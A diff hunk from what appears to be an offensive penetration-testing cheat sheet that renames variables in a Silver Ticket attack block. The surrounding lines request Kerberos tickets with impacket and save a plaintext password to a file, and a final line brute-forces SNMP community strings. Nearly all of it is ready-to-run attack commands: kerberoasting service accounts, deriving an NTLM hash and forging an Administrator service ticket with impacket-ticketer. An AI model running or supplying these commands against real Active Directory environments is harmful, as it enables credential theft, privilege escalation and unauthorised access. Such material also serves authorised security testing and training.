@@ -351,11 +351,11 @@ TGT=$(impacket-getTGT $DOM/'$USERNAME':'$PASSWORD' -dc-ip $TARGET | grep -oP '(?
 ST='cifs/$DC'; F=$(impacket-getST $DOM/'$USERNAME':'$PASSWORD' -dc-ip $TARGET -spn $ST | grep -oP '(?<=\[\*\] Saving ticket in ).*'); echo "[*] Saving ticket in $F"; export KRB5CCNAME="$F"; chmod 0600 "$F"; echo '$PASSWORD' > kpassfile; kinit --password-file='kpassfile' -c "$KRB5CCNAME" '$USERNAME@$KRB5DOM'; klist
 
 +---------- Silver Ticket Attacks ----------+
-DOMSID=$(impacket-getPac '$DOM'/'$USERNAME':'$PASSWORD' -targetUser 'Administrator' 2>/dev/null | grep 'Domain SID: ' | cut -d ':' -f 2- | tr -d ' ')
-DOMSPN=$(impacket-GetUserSPNs -dc-ip $TARGET '$DOM'/'$USERNAME':'$PASSWORD' -request | awk '{print $1}' | grep -vE 'Impacket|\$krb5|Service|----|^$|\[' | cut -d '/' -f 1)
-DOMNTLM=$(echo -n '$PASSWORD' | iconv -t UTF-16LE | openssl dgst -md4 | cut -d ' ' -f 2 | sed 's/.*/\U&/')
-echo "$DOMSID\n$DOMSPN\n$DOMNTLM"
-impacket-ticketer -domain '$TARGET' -domain-sid "$DOMSID" -nthash "$DOMNTLM" -spn "$DOMSPN/$TARGET" Administrator
+TICKET_SID=$(impacket-getPac '$DOM'/'$USERNAME':'$PASSWORD' -targetUser 'Administrator' 2>/dev/null | grep 'Domain SID: ' | cut -d ':' -f 2- | tr -d ' ')
+TICKET_SPN=$(impacket-GetUserSPNs -dc-ip $TARGET '$DOM'/'$USERNAME':'$PASSWORD' -request | awk '{print $1}' | grep -vE 'Impacket|\$krb5|Service|----|^$|\[' | cut -d '/' -f 1)
+TICKET_NTLM=$(echo -n '$PASSWORD' | iconv -t UTF-16LE | openssl dgst -md4 | cut -d ' ' -f 2 | sed 's/.*/\U&/')
+echo "$TICKET_SID\n$TICKET_SPN\n$TICKET_NTLM"
+impacket-ticketer -domain '$TARGET' -domain-sid "$TICKET_SID" -nthash "$TICKET_NTLM" -spn "$TICKET_SPN/$TARGET" Administrator
 
 [*] (161) SNMP
 (onesixtyone $TARGET -c /usr/share/wordlists/seclists/Discovery/SNMP/snmp.txt -w 5 -o SNMPsmall.onesixtyone &)
